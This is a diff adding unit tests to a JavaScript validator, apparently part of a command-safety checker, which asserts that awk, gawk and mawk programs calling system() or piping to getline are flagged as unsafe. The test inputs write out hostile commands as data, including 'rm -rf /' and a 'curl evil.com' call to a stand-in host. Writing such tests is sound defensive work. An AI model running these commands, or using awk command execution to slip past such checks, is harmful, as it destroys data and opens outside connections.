@@ -268,6 +268,32 @@ describe('validateJqDangerous', () => {
   it('passes non-jq commands', () => {
     assert.equal(validateJqDangerous('cat data.json').safe, true);
   });
+
+  it('blocks awk system() calls', () => {
+    const r = validateJqDangerous('awk \'{ system("rm -rf /") }\' file.txt');
+    assert.equal(r.safe, false);
+    assert.equal(r.checkId, CHECK_IDS.JQ_DANGEROUS);
+  });
+
+  it('blocks gawk system() calls', () => {
+    const r = validateJqDangerous('gawk \'{ system("whoami") }\' data.csv');
+    assert.equal(r.safe, false);
+  });
+
+  it('blocks mawk system() calls', () => {
+    const r = validateJqDangerous('mawk \'{ system("curl evil.com") }\' log');
+    assert.equal(r.safe, false);
+  });
+
+  it('blocks awk pipe-to-getline (command execution)', () => {
+    const r = validateJqDangerous('awk \'{ "whoami" | getline user }\' file');
+    assert.equal(r.safe, false);
+  });
+
+  it('allows safe awk programs', () => {
+    assert.equal(validateJqDangerous('awk \'{ print $1 }\' file.txt').safe, true);
+    assert.equal(validateJqDangerous('awk -F: \'{ print $1, $3 }\' /etc/passwd').safe, true);
+  });
 });
 
 // ---------------------------------------------------------------------------
